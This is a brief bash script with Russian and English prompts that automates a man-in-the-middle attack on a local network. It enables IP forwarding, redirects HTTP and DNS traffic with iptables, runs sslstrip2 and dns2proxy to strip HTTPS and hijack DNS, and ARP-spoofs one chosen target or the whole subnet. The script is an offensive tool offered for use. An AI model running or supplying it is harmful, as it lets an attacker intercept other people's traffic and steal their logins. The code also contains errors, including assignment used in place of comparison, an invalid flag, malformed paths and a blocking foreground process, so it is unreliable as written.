# !/bin/bash

netstat -nr
echo "enter IP Выбери шлюз"
read "IP"
echo "1" > /proc/sys/net/ipv4/ip_forward
echo "enter target port Выбери порт default-6000 to default, enter 0"
read "port"
if port=0
then
	port=6000
fi
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port
sudo iptables -t nat -A PREROUTING -p udp --destination-port 53 -J REDIRECT --to-port 53
python2 ./~/sslstrip2/sslstrip.py -l $port
python2 ./~/dns2proxy/dns2proxy.py
echo "Enter IP of your target, if 0, spoof all"
read "targIP"
if targIP=0
then
	targIP=
fi
arpspoof -i wlan0 -t $targIP $IP
